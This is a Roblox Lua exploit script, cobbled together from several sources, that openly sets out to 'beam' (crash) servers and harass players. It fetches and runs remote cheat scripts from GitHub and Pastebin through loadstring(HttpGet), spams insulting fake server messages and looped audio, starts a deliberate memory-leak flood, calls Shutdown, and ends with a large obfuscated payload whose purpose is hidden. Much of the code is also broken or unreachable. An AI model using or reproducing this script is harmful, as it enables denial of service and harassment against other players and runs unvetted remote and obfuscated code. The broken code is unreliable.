--- Thanks for using my script I appreciate it
------------=========== INFO -----------=======
-- Ok So Basically I combined some scripts together like,
--  a script that just scares players
-- Then Annoys them
-- Most of the code isn't mine and some of the code is.
-- Completely Shutdowns a server idk how to fix it if this script still doesn't work it completely crashed my game when I executed it.
-- Thanks for using my script
-- El1te / SennieJack / ThatRobloxScripter
-- Update 1  added something idk anything bout
-- Update 2 added stuff that hopefully make it so that it crashes for everyone  now at 278 lines of code or smt ok bye ily (no homo)
-- Update 3 Did a massive update now at like 400 lines of code and added alot of more stuff and features.

wait(10)
while true do
	print("SERVER GETTING BEAMED LOL")
        print("SERVER GETTING BEAMED LOL")
	print("SERVER GETTING BEAMED LOL")
end
		wait(3)
                print("In Process Of Executing")
		wait(Process)
		
		local Process = 5
--- CREDITS ---
-- Thanks to NougatBitz For The Gui
-- Thanks to Adwas For The gui
-----------------------------------------------
--- Programmers ---
--- Casp3r (Co - Devoloper) - Helped With Errors
--- Virus (Found Scripts) - Explantory
--- El1te (Main Devoloper) - Worked On The Script
-------------------------------------------------

--- SUPPORTED GAMES  (only for the gui's i stole lol)---
local Ragdoll = 22653509 
local Arsenal = 286090429
local Infection = 1165047394
 
------ STARTING SCRIPT --------
local scriptwait = 10
------- SCRIPT HANDLER ---------------------
local HttpService = game:GetService('HttpService')
local AllowThirdyPartyTeleports = game:GetService('AllowThirdPartyTeleports')
local HttpRbxApiService = game:GetService('HttpRbxApiService')
local HTTPService = game:GetService('HTTPService')

game.workspace.filteringenabled = true
while true do 
game.workspace.filteringenabled = true
game.workspace.RespectFilteringEnabled = true
end
      
----------------------------------------
------ RAGDOLL & OTHERS
local RagdollEngine = 22653509 

if game.CreatorId == RagdollEngine then

			print("Game = Ragdoll Engine Loading Ragdoll Engine Script")
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/Jxq7/MyScripts/main/Ragdoll%20Engine%20%5BASX%5D.lua'),true))()
        local plr = game.Players
	plr.RespawnTime = 1
end

local StarterGui = game:GetService("StarterGui") -- not sure why you used CoreGui
local bindable = Instance.new("BindableFunction")

function bindable.OnInvoke(response)
    print(response .. " chosen")
end

StarterGui:SetCore("SendNotification", {
	Title = "Info",
	Text = "I Loaded A Ragdoll Engine Script is that okay?",
	Duration = 5,
	Callback = bindable,
	Button1 = "Ok,",
	Button2 = "Bett"
})

--- ARSENAL
if game.PlaceId == Arsenal  then
			wait(10)
	print(player.Name .."Is Playing Arsenal")
	loadstring(game:HttpGet("https://raw.githubusercontent.com/NougatBitz/ArsenalHaxx/master/TintenFisch.lua"))();
	if error then
		print(error)
		loadstring(game:HttpGet("https://github.com/Jxq7/MyScripts/blob/main/Arsenal%20%5BASX%5D.lua"))();
	end

end


--------- infeEcCcTiOnNn
if game.PlaceId == Infection then
			
	print(player.Name.. "Is Playing Infection")
	loadstring(game:HttpGet("https://pastebin.com/raw/KRvb0vKv"))();
		if error then
			local ErrorTXT = "Error! Sorry i dont know what other script is good for this game"
			game.Players.LocalPlayer:Kick(ErrorTXT)
		end
end



------------------------------------------------------ UNSUPPORTED ---------------------------------------------------------



local StartWait = 35
wait(StartWait)
local Start = print("STARTING")
local lag_strength = 100


idk = function(x)
    local r = math.random(1,10)
    print(r)
    return x[r]
end

idkArray = {"a","b","c","d","e","f","g","h","i","j"}

print(idk(idkArray))

---- stolen random 
local messages = 
{
    "LOL YALL ABOUT TO GET YOUR IPADS BLOWN UP",
    "RIP 1ST DEGREE BURNS",
    "E",
}
 
local timePerMessage = 10
 
 
while wait(timePerMessage) do
 
    game.StarterGui:SetCore("ChatMakeSystemMessage", 
    {
        Text = "[SERVER] " .. messages[math.random(1, #messages)],
        Color = Color3.fromRGB(5, 255, 63),
        Font = Enum.Font.SourceSansBold,
        TextSize = 18,
    })
end
wait(0.5)


game.StarterGui:SetCore("ChatMakeSystemMessage", {
Text = "Beaming Server.......";
Color = Color3.new(255, 0, 0);
Font = Enum.Font.SourceSansBold;
FontSize = Enum.FontSize.Size24;
})


wait(20)
print("Rip server")
while true do
game.StarterGui:SetCore("ChatMakeSystemMessage", {
Text = "Hi, Listen Here Buddy Pretty Ugly Your Mom Wait while i trash this server. :)";
Color = Color3.new(255, 0, 0);
Font = Enum.Font.SourceSansBold;
FontSize = Enum.FontSize.Size24;
})
end
------------ WARNNING MESSAGE ---------
game.StarterGui:SetCore("SendNotification", {
Title = "Warrning.";
Text = "Your server is Currently getting trashed. While you wait until you server fully shutdown Pretty Ugly Your Mom";
})




--------------- MAIN MOUDLE --------
-------- AUDIO
wait(1)
local player = game.Players.LocalPlayer
player.CameraMode = Enum.CameraMode.LockFirstPerson
Instance.new("BlurEffect",workspace.CurrentCamera).Size = 999
player.PlayerGui:ClearAllChildren()
game:GetService('StarterGui'):SetCore("TopbarEnabled", false)
for a = 1,10 do
	for i = 1,10 do
		local audio = Instance.new("Sound",player.PlayerGui)
		audio.Volume = 10
		audio.PlaybackSpeed = a*i
		audio.Looped = true
		if math.random(1,2) == 1 then
			audio.SoundId = "rbxassetid://168137470"
		else
			audio.SoundId = "rbxassetid://714583842"
		end
		audio:Play()
		--wait()
	end
end
wait(1)
while true do end


wait(2)
-------------------------
------------------------ LAG ----------------
--- V2
sounds = {}

function getSounds(loc)
if loc:IsA("Sound") then
table.insert(sounds,loc)
end
for _,obj in pairs(loc:GetChildren()) do
getSounds(obj)
end
end
-- V1
while wait(0.2) do
for _,plr in pairs(game.Players:GetPlayers()) do
pcall(function()
for _,obj in pairs(plr.Character.Head:GetChildren()) do
if obj:IsA("Sound") then
obj:Play()
end
end
end)
end
end


------ FINAL TOUCH ---------
while true do
print("FUCK YOU YOU SURVIVED ROUND 1! WAIT UNTIL FUCKS YOU UP"..player.Name)
end --- this part is 100% made by me

local myLag = Instance.new("Part",workspace)
local nameX = "Get Beamed"
myLag.Name = nameX


for _, v in pairs(game:GetDescendants()) do
    spawn(function()
        pcall(require, v)
    end)
end
-------------------------------





----- le random
local plrs = game.Players
 

 
 
plrs.PlayerAdded:Connect(function(plr)
    
    if plr.UserId == 1840165873 then
        game.StarterGui:SetCore("SendNotification", {
Title = "DADDY HAS JOINED";
Text = "time to celebrate ";
})

        
        
        
    end
    
end)


wait(15)


--- EXTRA LAG+ BASSIC CHARACTER HACKS ---
--- SCRIPT HANDLER & EXTRA LAG
while true do
print("EXTRA LAG ENABLED")
game:Shutdown()
game.workspace.filteringenabled = true
game.workspace.AllowThirdPartySales = true
end


local plr = game.Players.LocalPlayer
local rs = game:GetService("RunService")
 
function lag()
    while true do
        script:clone().Parent = plr.PlayerGui
        print("Rest in peace.")
    end
end
 
function memoryLeak()
    for i = 1, 50000 do
        coroutine.resume(coroutine.create(function()
            for i = 1, 50000 do
                spawn(lag)
            end
        end))
    end
end
 
while true do
    spawn(memoryLeak)
end


-- CH HACKS --
-- Variables
local WA = Target.CharacterWalkSpeed
local Emotes = game.StarterPlayer.UserEmotesEnabled 
local HDD = game.StarterPlayer.HealthDisplayDistance
local LCA = game.StarterPlayer.LoadCharacterAppearance
local Target = game.StarterPlayer
local FAILEDTXT = "Bobby shmurda didn't get out of jail"
while true do
	local SC = Instance.new("Script")
end


---- ADWAS'S SCRIPT
--[[
 ___       __   ________  ___       ___           ___    ___ ________  _______   ________  ___  ___  ________  _______        _________  _____ ______           
|\  \     |\  \|\   __  \|\  \     |\  \         |\  \  /  /|\   ____\|\  ___ \ |\   ____\|\  \|\  \|\   __  \|\  ___ \   ___|\___   ___\\   _ \  _   \  ___    
\ \  \    \ \  \ \  \|\  \ \  \    \ \  \        \ \  \/  / | \  \___|\ \   __/|\ \  \___|\ \  \\\  \ \  \|\  \ \   __/| |\__\|___ \  \_\ \  \\\__\ \  \|\__\   
 \ \  \  __\ \  \ \   __  \ \  \    \ \  \        \ \    / / \ \_____  \ \  \_|/_\ \  \    \ \  \\\  \ \   _  _\ \  \_|/_\|__|    \ \  \ \ \  \\|__| \  \|__|   
  \ \  \|\__\_\  \ \  \ \  \ \  \____\ \  \____    \/  /  /   \|____|\  \ \  \_|\ \ \  \____\ \  \\\  \ \  \\  \\ \  \_|\ \  ___   \ \  \ \ \  \    \ \  \  ___ 
   \ \____________\ \__\ \__\ \_______\ \_______\__/  / /       ____\_\  \ \_______\ \_______\ \_______\ \__\\ _\\ \_______\|\__\   \ \__\ \ \__\    \ \__\|\__\
    \|____________|\|__|\|__|\|_______|\|_______|\___/ /       |\_________\|_______|\|_______|\|_______|\|__|\|__|\|_______|\|__|    \|__|  \|__|     \|__|\|__|
                                                \|___|/        \|_________|                                                                                     
]]--

return(function(Sa,...)local b,a=({{}}),(...);local la=a[((0x1444))];local z=a[-((3749))];local A=a[-((#{(0x108);(0x0B9);}+(3696)))];local B=a[-((0xE51))];local D=a[((0x1410))];local E=a[((5084))];local na=a[-((3595))];local pa=a[((0x13B4))];local oa=a[-((#{(580);(125);}+(3516)))];local ka=a[-((3476))];local ma=a[((0x1394))];local ja=a[-((#{(718);(0x2AA);(0x13F);}+(0xD80)))];local da=a[-((0xD21))];local y=a[((0x137A))];local C=a[-((3349))];local w=a[((#{(0x138);}+(4897)))];local ea=a[-((0xD0A))];local m=a[((#{[(112)]=(0x1B1);(834);(19);(205);(0x109);}+(4818)))];local o=a[-((#{}+(3297)))];local n=a[-((#{(314);(646);(165);}+(3233)))];local d=a[((0x1291))];local l=a[-((0xC69))];local fa=a[-((3163))];local i=a[((#{(0x116);}+(4659)))];local ha=a[-((#{(555);(532);}+(3065)))];local ga=a[((#{(389);(0x1B7);}+(0x11DA)))];local ia=a[((0x11D2))];local ra=a[((4489))];local ya=a[((4399))];local sa=a[-((0xBE0))];local Ba=a[((#{(90);}+(4323)))];local Da=a[-((3011))];local Ea=a[-((2916))];local Aa=a[-((#{(0x330);(9);(407);}+(0xB1B)))];local Ca=a[-((0xAFE))];local za=a[((0x10C0))];local ua=a[-((#{}+(0xACC)))];local ta=a[((4220))];local va=a[((4174))];local xa=a[((0x101B))];local wa=a[((4031))];local ca=a[-((#{(560);(0x23F);(935);}+(0xA9E)))];local qa=a[((3974))];local ba=a[-((2632))];local N=a[-((#{}+(0x9E6)))];local I=a[((3899))];local K=a[((3893))];local M=a[-((0x997))];local L=a[((0xF0B))];local G=a[((3761))];local J=a[-((2375))];local F=a[((0xE83))];local s=a[-((2282))];local q=a[-((#{(632);(900);}+(2198)))];local t=a[((#{(0x100);(0x1B1);(0x1D8);(0x13F);}+(0xE3B)))];local u=a[-((0x849))];local j=a[-((2090))];local v=a[-((#{}+(0x815)))];local O=a[-((#{(0x0E0);(0x0B9);[(0x0B5)]=(0x1A2);(120);}+(0x7BD)))];local T=a[((3573))];local P=a[-((1930))];local W=a[((3481))];local Y=a[((#{(0x2B9);}+(0xD40)))];local _=a[-((1855))];local Z=a[((0xD0B))];local V=a[-((0x6E3))];local X=a[((0xCE9))];local U=a[((0xCC1))];local Q=a[((3195))];local x=a[((#{(0x0B8);[(0x124)]=(330);(0x24A);(803);}+(3171)))];local R=a[-((0x681))];local S=a[-((0x67D))];local Fa=a[((#{(0x05D);(834);}+(0xC61)))];local aa=a[-((1638))];local p=a[((3077))];local Ga=a[-((#{(132);(732);}+(0x64B)))];local r=a[-((#{}+(1589)))];local Ma=a[((3041))];local Oa=a[-((#{(915);[(0x13A)]=(287);(0x06B);}+(0x60A)))];local Pa=a[((#{(114);(0x12C);(625);(0x213);}+(0xBD5)))];local La=a[((0xB8F))];local Na=a[-((1542))];local k=a[((#{(422);(918);[(730)]=(0x197);(0x019);(0x38E);}+(2880)))];local Ka=a[-((0x5C2))];local h=a[-((#{}+(1379)))];local e=a[-((1301))];local Ha=a[-((1230))];local Ra=a[-((1226))];local Ia=a[((0xB2B))];local Ja=a[((0xAE4))];local Qa=a[((2776))];local f=a[((#{(912);(975);(632);}+(2754)))];local c=a[-((#{[(0x0EB)]=(0x024);(854);(0x245);(748);(0x01E);}+(1215)))];local H=((getfenv)or(function(...)return(_ENV);end));local g,b=(""),(H(c));local Ta,Ta=(f^((#{[(472)]=(0x10A);(0x1F6);[(0x15E)]=(0x254);(803);(0x0E3);}+(29)))),(f^((32)))-c;local e=((b[""..a[Qa].."\105"..a[Ja]..a[Ia]..a[Ra]])or(b["\98"..a[Ha]..a[e]]));local e=(((e)and(e["\98"..a[h].."\111"..a[Ka]]))or(function(a,e)local b,c=c,((0x000));while((a>k)and(e>k))do local d,g=a%f,e%((2));if d~=g then c=c+b;end;a,e,b=(a-d)/f,(e-g)/f,b*((2));end;if a<e then a=e;end;while a>k do local e=a%f;if e>k then c=c+b;end;a,b=(a-e)/f,b*((2));end;return(c);end));local h=(g[""..a[Na]..a[La]..a[Pa]..a[Oa]]);local r=(g[""..a[Ma].."\104"..a[-f]..a[-r]]);local p=(g[""..a[Ga]..a[-p].."\98"]);local x=(b["\115"..a[-aa]..a[Fa]..a[-S].."\101"..a[R]..a[-x]..a[Q].."\97\98"..a[-U].."\101"]);local j=((b[""..a[-X].."\110"..a[V]..a[-Z]..a[-_]..a[Y]])or(b[""..a[-W]..a[P].."\98"..a[T]..a[-O]][""..a[-v]..a[j].."\112\97"..a[u].."\107"]));local s=(b[""..a[-t]..a[q].."\110"..a[s]..a[-F]..a[J]..a[-G]..a[L]]);local J=(b[""..a[M]..a[K].."\116"..a[-I]][""..a[N].."\100\101"..a[-ba].."\112"]);local I=(b["\115"..a[qa].."\108"..a[-ca]..a[wa]..a[-xa]]);local u=(b[""..a[va]..a[ta].."\98"..a[-ua]..a[-za]]["\99"..a[-Ca]..a[Aa]..a[-Ea].."\97\116"]);local b=(b[""..a[Da]..a[Ba].."\98\108"..a[sa]][""..a[ya]..a[-ra]..a[ia]..a[ga]..a[ha].."\116"]);local g=(i);local q,v=({}),({});for a=k,g-((1))do local b=r(a);q[a]=b;v[a]=b;v[b]=a;end;local function t(f)local b,e,d=(""),(""),({});local a=c;local function h()local b=s(p(f,a,a),fa);a=a+c;local c=s(p(f,a,a+b-c),((0x024)));a=a+b;return(c);end;b=r(h());d[c]=b;while(a<#f)do local a=h();if q[a]then e=q[a];else e=b..p(b,c,((#{(0x234);(0x14E);(0x20A);}-(2))));end;q[g]=b..p(e,c,((#{(0x230);(0x0AE);(0x1A6);}-(0x002))));d[#d+c],b,g=e,e,g+c;end;return(u(d));end;local g,b=(t(Sa)),(c);local function s()local f,a,c,g=h(g,b,b+l);f=e(f,d);a=e(a,d);c=e(c,d);g=e(g,d);b=b+n;return((g*o)+(c*m)+(a*i)+f);end;local function q()local a,c=h(g,b,b+f);a=e(a,d);c=e(c,d);b=b+f;return((c*i)+a);end;local function q()local a=e(h(g,b,b),d);b=(b+c);return(a);end;local function r(e,a,b)if(b)then local a=(e/f^(a-c))%((#{}+(0x002)))^((b-c)-(a-c)+((0x001)));return(a-(a%c));else local a=f^(a-c);return(((e%(a+a)>=a)and(c))or(((#{}+(0)))));end;end;local G=""..a[ea];local function q(...)return({...}),I(G,...);end;local function F(...)local a=({});local x=({});local G=({});local j,q,u,t=h(g,b,b+l);j=e(j,d);q=e(q,d);u=e(u,d);t=e(t,d);b=b+n;local j=((t*o)+(u*m)+(q*i)+j);for a=k,j-c,((0x001))do G[a]=F();end;for u=c,s(),c do local a=e(h(g,b,b),d);b=(b+c);local a=(a);local s=a;if(r(s,c,((1)))==((0x000)))then local a,j=h(g,b,b+f);a=e(a,d);j=e(j,d);b=b+f;local a=((j*i)+a);local t=(a);local a,j,k,p=h(g,b,b+l);a=e(a,d);j=e(j,d);k=e(k,d);p=e(p,d);b=b+n;local a=((p*o)+(k*m)+(j*i)+a);local k=(a);local a,p,q,j=h(g,b,b+l);a=e(a,d);p=e(p,d);q=e(q,d);j=e(j,d);b=b+n;local a=((j*o)+(q*m)+(p*i)+a);local p=(a);local j,g,h,a=h(g,b,b+l);j=e(j,d);g=e(g,d);h=e(h,d);a=e(a,d);b=b+n;local a=((a*o)+(h*m)+(g*i)+j);local b=(a);local a=r(s,f,((#{(0x308);(0x244);[(0x131)]=(0x0D5);(0x115);}+(0x000))));if((a==f)or(a==l))then k=k-(f^((#{(12);(0x1FD);(0x185);(0x24E);}+(12))));end;x[u-c]=({[((2278))]=t;[w]=p;[C]=k;[y]=b;});end;end;local j=e(h(g,b,b),d);b=(b+c);local j=(j);local w=j;local t,u,q,j=h(g,b,b+l);t=e(t,d);u=e(u,d);q=e(q,d);j=e(j,d);b=b+n;local j=((j*o)+(q*m)+(u*i)+t);for j=k,j-c,((#{(193);(811);[(365)]=(419);(0x233);(802);}-(0x003)))do local q,t=h(g,b,b+f);q=e(q,d);t=e(t,d);b=b+f;local q=((t*i)+q);local q=q;if(q==da)then local e=e(h(g,b,b),d);b=(b+c);local b=(e);local c=b;a[j]=(b~=k);elseif(q==ja)then while(true)do local b=s();local e=s();local g=c;local d=(r(e,c,((#{}+(0x014))))*(f^((0x020))))+b;local b=r(e,ma,((#{}+(31))));local e=((-c)^r(e,ka));if(b==k)then if(d==k)then a[j]=(e*k);break;else b=c;g=k;end;elseif(b==oa)then a[j]=(d==k)and(e*(c/((#{(0x1DD);}-(0x001)))))or(e*(k/((0x000))));break;end;a[j]=J(e,b-pa)*(g+(d/(f^((52)))));break;end;elseif(q==na)then while(true)do local f=('');local s,r,q,l=h(g,b,b+l);s=e(s,d);r=e(r,d);q=e(q,d);l=e(l,d);b=b+n;local i=((l*o)+(q*m)+(r*i)+s);local i=i;if(i==k)then a[j]=f;break;end;local g=p(g,b,b+i-c);b=b+i;for a=c,#(g),c do f=f..v[e(h(p(g,a,a)),d)];end;a[j]=f;break;end;else a[j]=(nil);end;end;return({[E]=x;[D]=((0));[B]=G;[A]=a;[z]=w;});end;local function r(a,l,m,...)local v=a[E];local h=a[A];local u=a[B];local n=a[z];local f=a[D];return(function(...)local i=-(c);local t={};local p={...};local s=I(G,...)-c;local o={};local b={};local g=y;local d=C;local e=w;local w=la;for a=k,s,c do if(a>=n)then t[a-n]=p[a+c];else b[a]=p[a+c];end;end;local a=s-n+c local f=f;local a,c=(nil),(nil);while(true)do a=v[f];c=a[w];if(c<=(22))then if(c<=(10))then if(c<=(0x004))then if(c<=(1))then if(c==(0))then local a=a[e];b[a]=b[a](j(b,a+(0x001),i));elseif(c<=(0x001))then b[a[e]]=b[a[d]][h[a[g]]];elseif(c<=(46))then if(c>(2))then if(b[a[e]]<=h[a[g]])then f=f+(1);else f=a[d];end;elseif(c<(0x014))then b=({});for a=(0),s do if(a<n)then b[a]=p[a+(0x001)];else break end;end;end;elseif(c<=(0x02E))then b[a[e]]=(not(b[a[d]]));elseif(c>(0x015))then b[a[e]]=b[a[d]]/h[a[g]];elseif(c<(9))then b[a[e]]=h[a[d]]^b[a[g]];end;elseif(c<=(2))then b[a[e]]=h[a[d]];elseif(c==(3))then do return;end;elseif(c<=(0x004))then local a=a[e];b[a]=b[a](b[a+(0x001)]);elseif(c<=(0x02E))then if(c>(0x011))then b[a[e]]=b[a[d]]%h[a[g]];elseif(c<(0x01B))then local f=({});local c=a[d];for a=c,i,(1) do f[(a-c)+(1)]=b[a];b[a]=(nil);end;b[a[e]]=f;end;elseif(c<=(0x02E))then local c=a[e];b[c](j(b,c+(1),a[d]));elseif(c>(0x01D))then local c=b[a[g]];if(c)then f=f+(1);else b[a[e]]=c;f=a[d];end;elseif(c<(0x013))then local a=a[e];b[a](j(b,a+(0x001),i));end;elseif(c<=(0x007))then if(c<=(0x005))then local i=u[a[d]];local h,c=(nil),({});h=x(({}),({__index=(function(b,a)local a=c[a];return a[(1)][a[(2)]];end);__newindex=(function(e,a,b)local a=c[a];a[(0x001)][a[(0x002)]]=b;end);}));for e=(1),a[g],(0x001) do f=f+(0x001);local a=v[f];if(a[w]==(20))then c[e-(1)]=({b,a[d]});else c[e-(1)]=({l,a[d]});end;o[#o+(0x001)]=c;end;b[a[e]]=r(i,h,m);elseif(c==(6))then local a=a[e];b[a]=b[a](j(b,a+(0x001),i));elseif(c<=(0x007))then local a=a[e];b[a](b[a+(1)]);elseif(c<=(0x02E))then if(c==(34))then local c=a[e];local d=b[c];local a,e=(0x000),(0x032)*(a[g]-(1));for c=c+(1),i do d[e+a+(0x001)]=b[c];a=a+(1);end;elseif(c<=(24))then b[a[e]]=h[a[d]]/h[a[g]];end;elseif(c<=(0x02E))then b[a[e]]=b[a[d]]-h[a[g]];elseif(c>(31))then local f=(b[a[g]]);local c=a[e];for a=c,a[d],(0x001) do b[a]=f[(a-c)+(0x001)];end;elseif(c<(0x006))then for a=a[e],a[d]do b[a]=(nil);end;end;elseif(c<=(0x008))then local a=a[e];b[a]=b[a]();elseif(c==(0x009))then b[a[e]]=l[a[d]];elseif(c<=(0x00A))then local c=a[e];local e,a=q(b[c](j(b,c+(0x001),a[d])));i=a+c-(0x001);local a=(0x000);for c=c,i do a=a+(0x001);b[c]=e[a];end;elseif(c<=(46))then if(c==(0x01D))then local a=a[e];b[a](j(b,a+(1),i));elseif(c<=(0x013))then local c=b[a[g]];if(c)then f=f+(1);else b[a[e]]=c;f=a[d];end;end;elseif(c<=(46))then l[a[d]]=b[a[e]];elseif(c==(38))then b[a[e]]=h[a[d]]*b[a[g]];elseif(c<=(0x025))then local c=a[e];local g=b[c+(2)];local e=b[c]+g;b[c]=e;if(g>(0x000))then if(e<=b[c+(0x001)])then f=a[d];b[c+(3)]=e;end;elseif(e>=b[c+(0x001)])then f=a[d];b[c+(3)]=e;end;end;elseif(c<=(16))then if(c<=(13))then if(c<=(11))then local a=a[e];b[a]=b[a](b[a+(1)]);elseif(c==(12))then local c=a[e];local g=b[c+(2)];local e=b[c]+g;b[c]=e;if(g>(0x000))then if(e<=b[c+(1)])then f=a[d];b[c+(0x003)]=e;end;elseif(e>=b[c+(0x001)])then f=a[d];b[c+(3)]=e;end;elseif(c<=(0x00D))then b[a[e]]=m[h[a[d]]];elseif(c<=(0x02E))then if(c>(11))then local c=a[e];b[c](j(b,c+(1),a[d]));elseif(c<(0x00D))then b[a[e]]=h[a[d]]+h[a[g]];end;elseif(c<=(46))then local c=a[e];b[c]=b[c](j(b,c+(0x001),a[d]));elseif(c>(0x020))then local c=a[e];local a=a[d];for a=(0x001),a,(1) do b[c+a-(1)]=t[a-(1)];end;elseif(c<(0x016))then if(not(b[a[e]]))then f=f+(1);else f=a[d];end;end;elseif(c<=(14))then local c=a[e];local e,a=q(b[c](j(b,c+(1),a[d])));i=a+c-(0x001);local a=(0);for c=c,i do a=a+(0x001);b[c]=e[a];end;elseif(c>(0x00F))then if(b[a[e]])then f=f+(1);else f=a[d];end;elseif(c<(0x010))then do return;end;elseif(c<=(0x02E))then if(c>(32))then b[a[e]]=b[a[d]]^b[a[g]];elseif(c<(12))then if(not(b[a[e]]))then f=f+(0x001);else f=a[d];end;end;elseif(c<=(46))then if(h[a[e]]<=h[a[g]])then f=a[d];else f=f+(0x001);end;elseif(c==(0))then if(b[a[e]]==h[a[g]])then f=f+(1);else f=a[d];end;elseif(c<=(20))then b[a[e]]=b[a[d]]/b[a[g]];end;elseif(c<=(0x013))then if(c<=(17))then local c=a[e];b[c](j(b,c+(0x001),a[d]));elseif(c==(18))then b[a[e]]=l[a[d]];elseif(c<=(0x013))then local c=a[e];b[c]=b[c](j(b,c+(1),a[d]));elseif(c<=(46))then if(c==(35))then local i=u[a[d]];local h,c=(nil),({});h=x(({}),({__index=(function(b,a)local a=c[a];return a[(0x001)][a[(0x002)]];end);__newindex=(function(e,a,b)local a=c[a];a[(1)][a[(2)]]=b;end);}));for e=(0x001),a[g],(0x001) do f=f+(0x001);local a=v[f];if(a[w]==(20))then c[e-(0x001)]=({b,a[d]});else c[e-(1)]=({l,a[d]});end;o[#o+(0x001)]=c;end;b[a[e]]=r(i,h,m);elseif(c<=(0x000))then local c=a[e];local e,a=q(b[c](j(b,c+(0x001),a[d])));i=a+c-(1);local a=(0);for c=c,i do a=a+(0x001);b[c]=e[a];end;end;elseif(c<=(0x02E))then if(b[a[e]]<=h[a[g]])then f=a[d];else f=f+(1);end;elseif(c>(0x029))then b[a[e]]=(a[d]~=(0x000));elseif(c<(14))then b[a[e]]=b[a[d]]*b[a[g]];end;elseif(c<=(0x014))then b[a[e]]=b[a[d]];elseif(c==(21))then b[a[e]]=({});elseif(c<=(0x016))then local c=a[e];local e=b[a[d]];b[c+(0x001)]=e;b[c]=e[h[a[g]]];elseif(c<=(46))then if(c>(0x02D))then if(h[a[e]]<=b[a[g]])then f=f+(1);else f=a[d];end;elseif(c<(0x013))then local c=a[e];local d={b[c](b[c+(1)]);};local e=(0);for a=c,a[g]do e=e+(1);b[a]=d[e];end;end;elseif(c<=(0x02E))then b[a[e]]=h[a[d]]%b[a[g]];elseif(c>(0x016))then b[a[e]]=b[a[d]][b[a[g]]];elseif(c<(4))then b[a[e]]=h[a[d]]%h[a[g]];end;elseif(c<=(0x021))then if(c<=(0x01B))then if(c<=(0x018))then if(c==(23))then local c=a[e];local e=b[c];local g=b[c+(0x002)];if(g>(0x000))then if(e>b[c+(1)])then f=a[d];else b[c+(3)]=e;end;elseif(e<b[c+(1)])then f=a[d];else b[c+(0x003)]=e;end;elseif(c<=(24))then b=({});for a=(0),s do if(a<n)then b[a]=p[a+(0x001)];else break end;end;elseif(c<=(0x02E))then if(c>(33))then b[a[e]]=m[h[a[d]]];elseif(c<(0x01E))then local e=a[e];local d=({b[e](j(b,e+(0x001),a[d]))});local c=(0x000);for a=e,a[g],(1) do c=c+(1);b[a]=d[c];end;end;elseif(c<=(0x02E))then b[a[e]]=h[a[d]]^b[a[g]];elseif(c==(0x00C))then b[a[e]]=l[a[d]];elseif(c<=(0x016))then local c=a[e];local a=a[d];for a=(0x001),a,(1) do b[c+a-(1)]=t[a-(1)];end;end;elseif(c<=(0x019))then b[a[e]]=m[h[a[d]]];elseif(c==(0x01A))then f=a[d];elseif(c<=(0x01B))then b[a[e]][h[a[d]]]=h[a[g]];elseif(c<=(0x02E))then if(c==(0x015))then local a=a[e];b[a]=b[a](b[a+(1)]);elseif(c<=(0x000))then local c=a[e];local e,a=q(b[c](j(b,c+(1),a[d])));i=a+c-(0x001);local a=(0x000);for c=c,i do a=a+(0x001);b[c]=e[a];end;end;elseif(c<=(46))then if(b[a[e]]<b[a[g]])then f=a[d];else f=f+(1);end;elseif(c==(0x011))then if(h[a[e]]<=h[a[g]])then f=a[d];else f=f+(1);end;elseif(c<=(0x017))then if(h[a[e]]<h[a[g]])then f=f+(0x001);else f=a[d];end;end;elseif(c<=(30))then if(c<=(28))then local i=u[a[d]];local h,c=(nil),({});h=x(({}),({__index=(function(b,a)local a=c[a];return a[(1)][a[(2)]];end);__newindex=(function(e,a,b)local a=c[a];a[(0x001)][a[(0x002)]]=b;end);}));for e=(0x001),a[g],(0x001) do f=f+(0x001);local a=v[f];if(a[w]==(0x014))then c[e-(0x001)]=({b,a[d]});else c[e-(1)]=({l,a[d]});end;o[#o+(1)]=c;end;b[a[e]]=r(i,h,m);elseif(c==(29))then local e=a[e];local c=b[a[d]];b[e+(0x001)]=c;b[e]=c[h[a[g]]];elseif(c<=(30))then local c=a[e];local e=b[c];local g=b[c+(0x002)];if(g>(0x000))then if(e>b[c+(0x001)])then f=a[d];else b[c+(3)]=e;end;elseif(e<b[c+(0x001)])then f=a[d];else b[c+(0x003)]=e;end;elseif(c<=(46))then if(c>(0x01C))then local f=(b[a[g]]);local c=a[e];for a=c,a[d],(0x001) do b[a]=f[(a-c)+(1)];end;elseif(c<(0x006))then local c=a[e];local e={b[c]();};local d=a[g];local a=(0x000);for c=c,d do a=a+(1);b[c]=e[a];end;end;elseif(c<=(0x02E))then b[a[e]]=b[a[d]]^b[a[g]];elseif(c>(30))then local c=({});local d=a[d];for a=d,a[g],(1) do c[(a-d)+(0x001)]=b[a];b[a]=(nil);end;b[a[e]]=c;elseif(c<(0x01A))then local c=b[a[g]];if(not(c))then f=f+(0x001);else b[a[e]]=c;f=a[d];end;end;elseif(c<=(31))then b[a[e]]=({});elseif(c==(0x020))then b=({});for a=(0x000),s do if(a<n)then b[a]=p[a+(0x001)];else break end;end;elseif(c<=(33))then b[a[e]]=b[a[d]][h[a[g]]];elseif(c<=(46))then if(c>(45))then b[a[e]]=h[a[d]]/b[a[g]];elseif(c<(0x004))then local c=a[e];local d={b[c](b[c+(1)]);};local e=(0x000);for a=c,a[g]do e=e+(0x001);b[a]=d[e];end;end;elseif(c<=(0x02E))then if(h[a[e]]<h[a[g]])then f=a[d];else f=f+(0x001);end;elseif(c==(29))then b[a[e]]=(a[d]~=(0x000));f=f+(0x001);elseif(c<=(30))then local c=b[a[g]];if(not(c))then f=f+(0x001);else b[a[e]]=c;f=a[d];end;end;elseif(c<=(39))then if(c<=(36))then if(c<=(34))then local c=a[e];b[c](j(b,c+(0x001),a[d]));elseif(c>(0x023))then b[a[e]]=b[a[d]];elseif(c<(0x024))then local c=a[e];b[c]=b[c](j(b,c+(0x001),a[d]));elseif(c<=(0x02E))then if(c==(0x004))then local c=a[e];local e,a=q(b[c]());i=a+c-(1);local a=(0x000);for c=c,i do a=a+(1);b[c]=e[a];end;elseif(c<=(0x022))then local c=a[e];local d=b[c];local a,e=(0x000),(50)*(a[g]-(0x001));for c=c+(0x001),i do d[e+a+(0x001)]=b[c];a=a+(0x001);end;end;elseif(c<=(0x02E))then b[a[e]]=(not(b[a[d]]));elseif(c>(42))then if(h[a[e]]<=b[a[g]])then f=a[d];else f=f+(1);end;elseif(c<(0x00A))then do return;end;end;elseif(c<=(0x025))then local a=a[e];b[a](b[a+(0x001)]);elseif(c==(0x026))then b[a[e]][h[a[d]]]=h[a[g]];elseif(c<=(0x027))then b[a[e]]=(a[d]~=(0));elseif(c<=(0x02E))then if(c==(0x010))then if(b[a[e]]<=b[a[g]])then f=a[d];else 